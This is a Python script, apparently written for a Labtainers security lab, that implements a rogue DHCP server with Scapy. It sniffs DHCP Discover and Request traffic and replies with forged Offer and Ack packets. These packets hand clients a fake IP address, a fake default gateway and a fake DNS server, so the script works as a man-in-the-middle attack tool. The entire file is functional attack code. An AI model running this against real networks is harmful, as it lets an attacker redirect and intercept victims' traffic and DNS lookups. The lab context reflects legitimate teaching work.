#!/usr/bin/env python3
"""
Rogue DHCP Server Simulator using Scapy for Labtainers.
Listens on the local interface (eth0) for DHCP Discover/Request and responds
with malicious configuration (fake gateway and fake DNS).
"""

import sys
import os
import time
import argparse
from scapy.all import sniff, sendp, Ether, IP, UDP, BOOTP, DHCP, get_if_hwaddr, get_if_addr

LOG_FILE = "/var/log/rogue_dhcp.log"
RESULT_LOG = "/home/ubuntu/.local/result/rogue_attack.log"

def log_event(msg):
    ts = time.strftime("[%Y-%m-%d %H:%M:%S]")
    line = f"{ts} {msg}"
    print(line, flush=True)
    for path in [LOG_FILE, RESULT_LOG]:
        try:
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "a") as f:
                f.write(line + "\n")
            os.chmod(path, 0o666)
        except Exception:
            pass

class RogueDHCPServer:
    def __init__(self, iface="eth0", fake_ip="10.10.0.210", fake_gw="10.10.0.20", fake_dns="10.10.0.20", lease_time=3600):
        self.iface = iface
        self.fake_ip = fake_ip
        self.fake_gw = fake_gw
        self.fake_dns = fake_dns
        self.lease_time = int(lease_time)
        try:
            self.my_mac = get_if_hwaddr(iface)
        except Exception:
            self.my_mac = "02:42:0a:0a:00:14"
        try:
            self.my_ip = get_if_addr(iface)
            if not self.my_ip or self.my_ip == "0.0.0.0":
                self.my_ip = "10.10.0.20"
        except Exception:
            self.my_ip = "10.10.0.20"

    def get_dhcp_type(self, pkt):
        if not pkt.haslayer(DHCP):
            return None
        for opt in pkt[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == "message-type":
                return opt[1]
        return None

    def get_requested_ip(self, pkt):
        if not pkt.haslayer(DHCP):
            return None
        for opt in pkt[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == "requested_addr":
                return opt[1]
        return None

    def get_server_id(self, pkt):
        if not pkt.haslayer(DHCP):
            return None
        for opt in pkt[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == "server_id":
                return opt[1]
        return None

    def handle_packet(self, pkt):
        if not pkt.haslayer(BOOTP) or not pkt.haslayer(DHCP):
            return

        # Only process requests from clients (op=1)
        if pkt[BOOTP].op != 1:
            return

        msg_type = self.get_dhcp_type(pkt)
        client_mac = pkt[Ether].src
        xid = pkt[BOOTP].xid
        chaddr = pkt[BOOTP].chaddr

        # DHCP DISCOVER -> send DHCP OFFER
        if msg_type == 1:
            log_event(f"[DISCOVER_RECEIVED] From {client_mac} (xid=0x{xid:x})")
            offer_opts = [
                ("message-type", "offer"),
                ("server_id", self.my_ip),
                ("lease_time", self.lease_time),
                ("subnet_mask", "255.255.255.0"),
                ("router", self.fake_gw),
                ("name_server", self.fake_dns),
                ("domain", "rogue.lab"),
                "end"
            ]
            offer_pkt = (
                Ether(src=self.my_mac, dst="ff:ff:ff:ff:ff:ff") /
                IP(src=self.my_ip, dst="255.255.255.255") /
                UDP(sport=67, dport=68) /
                BOOTP(op=2, yiaddr=self.fake_ip, siaddr=self.my_ip, chaddr=chaddr, xid=xid) /
                DHCP(options=offer_opts)
            )
            sendp(offer_pkt, iface=self.iface, verbose=False)
            log_event(f"[ROGUE_DHCP_OFFER] Sent OFFER IP {self.fake_ip} to {client_mac} (Fake GW: {self.fake_gw}, Fake DNS: {self.fake_dns})")

        # DHCP REQUEST -> send DHCP ACK
        elif msg_type == 3:
            req_ip = self.get_requested_ip(pkt) or pkt[BOOTP].ciaddr
            srv_id = self.get_server_id(pkt)
            log_event(f"[REQUEST_RECEIVED] From {client_mac} for IP {req_ip} (Target Server: {srv_id})")

            # Reply if client is requesting our offered fake IP or targeted our server
            if srv_id == self.my_ip or req_ip == self.fake_ip or srv_id is None:
                ack_opts = [
                    ("message-type", "ack"),
                    ("server_id", self.my_ip),
                    ("lease_time", self.lease_time),
                    ("subnet_mask", "255.255.255.0"),
                    ("router", self.fake_gw),
                    ("name_server", self.fake_dns),
                    ("domain", "rogue.lab"),
                    "end"
                ]
                ack_pkt = (
                    Ether(src=self.my_mac, dst="ff:ff:ff:ff:ff:ff") /
                    IP(src=self.my_ip, dst="255.255.255.255") /
                    UDP(sport=67, dport=68) /
                    BOOTP(op=2, yiaddr=self.fake_ip, siaddr=self.my_ip, chaddr=chaddr, xid=xid) /
                    DHCP(options=ack_opts)
                )
                sendp(ack_pkt, iface=self.iface, verbose=False)
                log_event(f"[ROGUE_DHCP_ACK] Sent ACK IP {self.fake_ip} to {client_mac} (Fake GW: {self.fake_gw}, Fake DNS: {self.fake_dns})")
            else:
                log_event(f"[IGNORED] Client chose legitimate DHCP Server {srv_id}")

    def run(self):
        log_event(f"[ROGUE_DHCP_ACTIVE] Rogue DHCP Server started on {self.iface}")
        log_event(f"[*] Attacker IP: {self.my_ip} (MAC: {self.my_mac})")
        log_event(f"[*] Offering Fake IP: {self.fake_ip}")
        log_event(f"[*] Poisoning Gateway: {self.fake_gw}")
        log_event(f"[*] Poisoning DNS: {self.fake_dns}")
        print("[*] Sniffing for DHCP traffic (Ctrl+C to stop)...", flush=True)
        sniff(filter="udp and (port 67 or port 68)", iface=self.iface, prn=self.handle_packet, store=False)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Rogue DHCP Server Simulator")
    parser.add_argument("--iface", default="eth0", help="Network interface (default: eth0)")
    parser.add_argument("--fake-ip", default="10.10.0.210", help="Fake IP to offer (default: 10.10.0.210)")
    parser.add_argument("--fake-gw", default="10.10.0.20", help="Fake Gateway (default: 10.10.0.20)")
    parser.add_argument("--fake-dns", default="10.10.0.20", help="Fake DNS (default: 10.10.0.20)")
    parser.add_argument("--lease", default=3600, type=int, help="Lease time in seconds (default: 3600)")
    args = parser.parse_args()

    server = RogueDHCPServer(
        iface=args.iface,
        fake_ip=args.fake_ip,
        fake_gw=args.fake_gw,
        fake_dns=args.fake_dns,
        lease_time=args.lease
    )
    try:
        server.run()
    except KeyboardInterrupt:
        log_event("[ROGUE_DHCP_STOPPED] Rogue DHCP Server terminated.")
